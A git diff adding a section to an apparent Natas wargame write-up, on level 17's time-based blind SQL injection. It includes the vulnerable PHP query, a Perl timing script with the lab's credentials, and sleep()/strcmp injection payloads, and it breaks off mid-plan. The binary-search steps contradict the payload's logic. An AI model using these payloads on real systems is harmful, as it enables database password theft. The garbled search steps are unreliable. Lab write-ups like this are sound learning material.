@@ -475,3 +475,117 @@ say $flag;
 ```
 
 Alas, the flag is: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+## 17 - Time what is time?
+
+```php
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+```
+
+Time for a time based attack! Maybe...
+
+This time there is a sql query, prone to injection, but there is no echo on the screen... so we don't know when we have a match or not - at least not visually!
+
+I noticed that I could perhaps use the `timings` tab of the firefox developer tools to check for variance in time when I have a match (for example, `username=natas17`) and when I do not have a match (say, `username=asdfasdfadsf`).
+
+```perl
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use v5.10;
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use Benchmark::Timer;
+
+my $url = 'http://natas17.natas.labs.overthewire.org/index.php';
+my $ua = LWP::UserAgent->new();
+
+sub make_request {
+	my $payload = shift;
+	my $request = POST $url, Content => [ username => $payload ];
+	$request->authorization_basic('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw');
+	my $response = $ua->request($request);
+}
+
+ 
+sub run_bench_for {
+	my $payload = shift;
+	my $t = Benchmark::Timer->new(skip => 1);
+	for(0 .. 20) {
+			$t->start($payload);
+			make_request($payload);
+			$t->stop($payload);
+	}
+	print $t->report;
+}
+
+run_bench_for("natas18");
+run_bench_for("asdfasdf");
+```
+
+And here is what I saw:
+
+```
+20 trials of natas18 (10.983s total), 549.156ms/trial
+20 trials of asdfasdf (10.928s total), 546.406ms/trial
+```
+
+Crap... that does not seem to be the case.... but... what if we introduced the delay! So, I found out that doing sql injection without visual feedback is literally called blind sql injection. And that there are levels: from normal blind (in which you may not see something obvious on the page, but perhaps a response header or status will cue you) to totally blind in which there is absolutelly no difference.
+
+So I searched for Totally Blind SQL injection and learned about MySQL's `sleep(n)` function and how we can use it to exploit stuff.
+
+We can basically chain together logical predicates that will or will not include the delay and that is how you fly blind!
+
+For example, re running the benchmark above but with payload as:
+
+```perl
+my $payload = "natas18\" and BINARY substring(password, $index, 1) = \"$char\" and sleep(2) #"
+```
+
+if the `$char` at `$index` of `password` matches, there will be a delay, if not, it will return fast.
+
+But, the longer delay on non matches makes it slow to linearly break the pass via bruteforce here. So let's attempt a binary search style bruteforce. First we'll have to learn how mysql deals with string comparisons.
+
+```sql
+STRCMP(expr1,expr2)
+
+STRCMP() returns 0 if the strings are the same, -1 if the first argument is smaller than the second according to the current sort order, and 1 otherwise.
+
+mysql> SELECT STRCMP('text', 'text2');
+        -> -1
+mysql> SELECT STRCMP('text2', 'text');
+        -> 1
+mysql> SELECT STRCMP('text', 'text');
+        -> 0
+```
+
+So, say we have these characters, in presumably ascending order:
+
+```perl
+my @possible_characters = split('', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
+```
+
+Using `strcmp` along with `substring` we can use binary search over the possible chars array to make discovery faster.
+
+```perl
+my $payload = "natas18\" and strcmp(BINARY substring(password, $index, 1), \"$char\") > 0 and sleep(2) #"
+```
+
+And say we have already matched a previous prefix of the password, lets say `$flag = aBcDe`.
+
+Then we can:
+
+1. Start with `$index = 1` (mysql is **not** zero-indexed)
+2. Get the middle char from array of possible chars and set it to `$char`
+3. evaluate if the `$payload` above causes the request to take longer than 2 seconds
+4. if the request takes longer, it means the desired character is in the bottom half of the array, so go back to #2, passing the bottom half.
+5. if, however, the request is fast, we will know that the next character is in fact in the upper half of the possible characters array. Go back to #1 passing the upper half.
+
+I'm tired, will continue tomorrow...
